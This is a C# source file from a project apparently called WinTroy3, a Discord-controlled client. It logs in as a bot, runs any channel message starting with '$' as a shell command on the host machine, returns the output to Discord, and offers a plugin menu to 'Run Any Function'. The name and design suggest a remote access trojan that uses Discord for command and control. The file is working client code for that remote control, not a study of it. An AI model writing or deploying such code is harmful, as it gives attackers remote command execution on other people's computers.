using Discord;
using Discord.Commands;
using Discord.WebSocket;
using Microsoft.Extensions.DependencyInjection;
using System;
using System.Reflection;
using System.Threading.Tasks;
using static WinTroy3_PluginLib.Config.BotConfig;
using WinTroy3_Client.Menu;
using WinTroy3_PluginLib;
using Control = WinTroy3_PluginLib.Control;
using System.Diagnostics;
using System.Threading;
using System.Windows.Forms;
using System.Collections.Generic;
using System.IO;

namespace WinTroy3_Client
{
    public class Bot
    {
        public static void ConnectBot()
        {
            new Bot().RunBotAsync().GetAwaiter().GetResult();
        }

        public static SocketUser _lastUser;
        public static ISocketMessageChannel _lastChannel;
        private DiscordSocketClient _client;
        private CommandService _commands;
        private IServiceProvider _services;

        public async Task RunBotAsync()
        {
            DiscordSocketConfig config = new DiscordSocketConfig
            {
                UseInteractionSnowflakeDate = false
            };

            _client = new DiscordSocketClient(config);
            _commands = new CommandService();

            _services = new ServiceCollection()
                .AddSingleton(_client)
                .AddSingleton(_commands)
                .BuildServiceProvider();

            _client.Log += Client_Log;
            _client.SelectMenuExecuted += SelectMenuHandler.SelectMenuExecutedSync;
            _client.InteractionCreated += ButtonHandler.HandleInteractionAsync;
            _client.ModalSubmitted += ButtonHandler.ModalSubmittedAsync;

            await RegisterCommandsAsync();

            await _client.LoginAsync(TokenType.Bot, GetToken());

            await _client.StartAsync();

            await Task.Delay(-1);
        }

        public async Task RegisterCommandsAsync()
        {
            _client.MessageReceived += HandleCommandAsync;
            await _commands.AddModulesAsync(Assembly.GetEntryAssembly(), _services);
        }

        public static (Embed Embed, MessageComponent Components) GetLibMenu()
        {
            var componentBuilder = new ComponentBuilder();
            for (int i = 0; i < Plugins.MenuButtons.Count; i++)
            {
                Plugin button = Plugins.MenuButtons[i];
                var buttonBuilder = new ButtonBuilder()
                        .WithLabel(button.ButtonLabel)
                        .WithCustomId(button.ButtonId)
                        .WithStyle(ButtonStyle.Primary);
                componentBuilder.WithButton(buttonBuilder);
            }
            var embed = new EmbedBuilder()
                .WithTitle("Library")
                .WithDescription("Run Any Function")
                .WithColor(Color.Green);
            return (embed.Build(), componentBuilder.Build());
        }

        private async Task ShowMainMenu(SocketUserMessage message)
        {
            var componentBuilder = new ComponentBuilder();
            for (int i = 0; i < Plugins.MenuButtons.Count; i++)
            {
                Plugin button = Plugins.MenuButtons[i];
                if (button.IsMainButton)
                {
                    var buttonBuilder = new ButtonBuilder()
                        .WithLabel(button.ButtonLabel)
                        .WithCustomId(button.ButtonId)
                        .WithStyle(ButtonStyle.Primary);
                    componentBuilder.WithButton(buttonBuilder);
                }
            }
            var embed = new EmbedBuilder()
                .WithTitle($"Main ({Process.GetCurrentProcess().Id})")
                .WithDescription("")
                .WithImageUrl(GetIcon("wt3"))
                .WithColor(Color.Green);
            await message.ReplyAsync(embed: embed.Build(), components: componentBuilder.Build());
        }

        private async Task Client_Log(LogMessage arg)
        {
            Control.Log(arg, true);
            await DiscordLogByLog(arg);
        }

        private async Task DiscordLogByLog(LogMessage arg)
        {
            var message = arg.Exception?.InnerException?.Message ?? arg.Exception?.Message ?? arg.Message;
            await DiscordLog(message);
        }

        private async Task DiscordLog(string message)
        {
            if (_lastChannel == null)
                return;
            await _lastChannel.SendMessageAsync(embed: GetInfoEmbed(message));
        }

        public static string GetIcon(string icon)
        {
            return  $"{Config.PathConfig.GetBaseUrl()}Icon/{icon}.png";
        }

        private Embed GetInfoEmbed(string arg)
        {
            return new EmbedBuilder()
                .WithTitle("Info")
                .WithDescription(arg)
                .WithColor(Color.Blue)
                .WithThumbnailUrl(GetIcon("info"))
                .Build();
        }

        private string ConvertToDecimalString(int number)
        {
            return ((double)number / 1000).ToString("0.0");
        }

        private async Task Cmd(SocketUserMessage message, string content)
        {
            int timeout = GetCmdTimeout();
            Console.WriteLine(timeout);
            var cancellationTokenSource = new CancellationTokenSource();
            var timeoutTask = Task.Delay(TimeSpan.FromMilliseconds(
                timeout),
                cancellationTokenSource.Token);
            var cmd = await message.ReplyAsync(embed: new EmbedBuilder()
                .WithTitle("CMD")
                .WithDescription("Waiting for response...")
                .WithThumbnailUrl(GetIcon("cmd"))
                .WithColor(Color.Green)
                .Build());
            var cmdTask = Task.Run(() =>
            {
                return CmdControl.Cmd(content);
            }, cancellationTokenSource.Token);
            var completedTask = await Task.WhenAny(cmdTask, timeoutTask);
            if (completedTask == timeoutTask)
                await DiscordLog(
                    $"Command execution timed out after {ConvertToDecimalString(timeout)} seconds");
            else
            {
                var result = await cmdTask;
                var text = $@"**Command:** ```{result.Command} ```
**Output:** ```{result.Output} ```
**Error:** ```{result.Error} ```";
                var data = new Respond();
                if (text.Length > 4096)
                {
                    var filePath = Config.PathConfig.GetTempPath() + Control.GetRandomString() + ".txt";
                    File.WriteAllText(filePath, text);
                    data.RespondFile = filePath;
                    text = string.Empty;
                }
                await cmd.ReplyAsync(embed: new EmbedBuilder()
                    .WithColor(Color.Green)
                    .WithTitle("CMD Result")
                    .WithDescription(text)
                    .Build()); ;
                await ButtonHandler.AddFiles(cmd.Channel, data, "CMD");
            }
            cancellationTokenSource.Cancel();
        }

        private async Task HandleCommandAsync(SocketMessage arg)
        {
            var message = arg as SocketUserMessage;
            if (message.Author.IsBot)
                return;
            string content = message.Content;
            ButtonHandler.SetLastChannel(message.Channel, message.Author);
            if (content == "main")
            {
                await ShowMainMenu(message);
                return;
            }
            else if (content.StartsWith("$"))
            {
                await Cmd(message, content.Substring(1).Trim());
                return;
            }
            var data = await ButtonHandler.Run(content, message);
            if (data == null)
                return;
            var modal = data.RespondModal;
            if (modal != null)
                await FollowupModal.Show(modal, message: message);
        }
    }
}
